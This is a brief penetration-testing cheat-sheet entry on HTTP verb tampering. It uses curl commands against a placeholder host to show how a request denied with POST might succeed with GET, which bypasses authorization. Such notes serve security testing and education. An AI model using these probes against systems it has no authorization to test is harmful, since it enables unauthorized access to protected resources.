# HTTP Verb Tampering

> Verb tampering could be used to bypass authentication. Test also for PUT or DELETE verbs.

Web Applications can include authentication to certain parts of the site only to a single method (i.e. POST). We can try to bypass authorization using verb tampering:

```bash
#Check available methods:
curl -v -X OPTIONS http://site.com

#Example of 403 Forbidden:
curl -v -X POST http://site.com
Response: HTTP 403 Forbidden

#Doing the same request but with GET can lead to auth bypass
curl -v -X GET http://site.com
Response: HTTP 200 OK
```
